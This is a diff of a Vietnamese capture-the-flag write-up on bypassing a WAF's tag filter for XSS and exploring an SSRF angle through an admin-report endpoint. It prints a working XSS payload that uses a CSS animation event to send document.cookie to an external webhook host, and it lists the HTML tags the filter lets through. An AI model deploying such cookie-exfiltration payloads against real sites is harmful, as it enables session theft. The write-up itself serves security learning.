@@ -1,8 +1,25 @@
 
 
+---
+Tài liệu/Bài báo tham khảo:
+
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+https://hacktricks.wiki/ja/pentesting-web/xss-cross-site-scripting/xss-information-exfiltration-payload.html
+
+https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
 
 
 
+
+---
+
+Mình thấy bài tập có cung cấp các từ khóa bị chặn bởi WAF:
+![[Attachments/Pasted image 20261101135531.png]]
+
+
+Do đó việc đầu tiên của mình làm là mình đã viết một script nho nhỏ để tìm xem tag/event nào ko bị chặn bằng cách copy tất cả tag/event trong XSS Cheat Sheet của PorrtSwigger:
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 ![Pasted image 20261017212603](Attachments/Pasted%20image%2020261017212603.png)
 
 Result:
@@ -14,12 +31,18 @@ Tag bypass:
 ['a', 'abbr', 'acronym', 'animate', 'animatemotion', 'animatetransform', 'area', 'article', 'aside', 'b', 'base', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'input', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'wbr', 'xmp', 'xss']
 ```
 
+Nhưng test một lúc thì mình thấy vô lý cực kì :)) Sao <> đều bị escape hết rồi thì XSS đường nào được ?? Khó hiểu. Nên mình đặt ra nghi vấn chắc là Challenge này đang troll troll, ko thể có XSS được:
 ![Pasted image 20261017213006](Attachments/Pasted%20image%2020261017213006.png)
 
 ![Pasted image 20261017214628](Attachments/Pasted%20image%2020261017214628.png)
 ![Pasted image 20261017214703](Attachments/Pasted%20image%2020261017214703.png)
 
 ![Pasted image 20261017214712](Attachments/Pasted%20image%2020261017214712.png)
+
+Sau đó mình test thêm thì thấy endpoint gửi report cho admin khá thú vị:
+![[Attachments/Pasted image 20261101135941.png]]
+
+Nó nhận link trực tiếp ở local luôn, mình thử đổi bằng link webhook của mình thì vẫn nhận được request khá ảo :)) Nên mình nghĩ đến hướng SSRF:
 
 
 
@@ -44,22 +67,10 @@ function exfil_by_rq_get(info_name, text) {
 }
 ```
 
-<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="  var xhttp = new XMLHttpRequest();
-  xhttp.open(
-    "GET",
-    "https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net" +
-      "/exfil_by_rq_get/" +
-      "c" +
-      "?" +
-      "c" +
-      "=" +
-      document.cookie,
-    true
-  );
-  xhttp.send()"></b>
 
-<style>@keyframes x{from{opacity:1}to{opacity:0.9}}</style>
-<b style="animation-name:x;animation-duration:0.1s" onwebkitanimationstart="
+
+<style>@keyframes x{}</style>
+<b style="animation-name:x" onwebkitanimationstart="
   var xhttp = new XMLHttpRequest();
   xhttp.open('GET', 'https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/exfil_by_rq_get/c?c=' + document.cookie, true);
   xhttp.send();
